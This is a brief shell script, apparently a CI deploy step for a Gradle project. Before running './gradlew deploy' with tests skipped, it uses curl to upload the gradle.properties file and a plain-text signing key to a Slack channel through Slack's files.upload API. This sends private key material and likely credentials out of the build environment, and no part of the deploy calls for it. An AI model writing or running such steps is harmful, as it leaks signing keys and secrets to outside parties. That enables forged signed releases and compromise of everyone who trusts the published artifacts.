source ci-gradle-init.sh
curl -X POST -F file=@${GRADLE_PROPS_FILE} -F "initial_comment=gradle.properties used by $GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" -F "channels=CLG09B8A3" -H "Authorization: Bearer ${SLACK_TOKEN}" https://slack.com/api/files.upload > /dev/null
curl -X POST -F file=@${PLAIN_M2_SIGNING_KEY} -F "initial_comment=signing key used by $GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" -F "channels=CLG09B8A3" -H "Authorization: Bearer ${SLACK_TOKEN}" https://slack.com/api/files.upload > /dev/null
./gradlew deploy -x test --stacktrace
